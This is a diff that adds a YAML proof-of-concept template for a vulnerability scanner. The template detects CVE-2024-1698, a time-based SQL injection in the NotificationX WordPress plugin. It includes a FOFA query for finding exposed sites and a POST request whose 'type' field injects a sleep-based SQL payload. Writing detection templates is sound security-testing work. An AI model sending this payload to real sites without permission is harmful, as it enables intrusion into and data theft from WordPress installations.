@@ -1,0 +1,29 @@
+id: poc-yaml-notificationx-sql-injection
+info:
+  name: NotificationX SQL注入漏洞(CVE-2024-1698)
+  severity: high
+  tags:
+  - CVE-2024-1698
+  - 两高一弱
+  finger: notificationx
+  fofa: body="/wp-content/plugins/notificationx"
+variables:
+  t1: random_int(3,7)
+requests:
+- method: POST
+  path: /wp-json/notificationx/v1/analytics
+  headers:
+    Content-Type: application/json
+  data: '{"nx_id": "1","type": "clicks`=1 and 1=sleep({{.t1}})-- -"}'
+  expression: 'status_code == 200 &&
+
+    contains(body,`{"success":true}`) &&
+
+    contains(content_type,"application/json") &&
+
+    duration > t1 &&
+
+    duration < 10
+
+    '
+transport: http
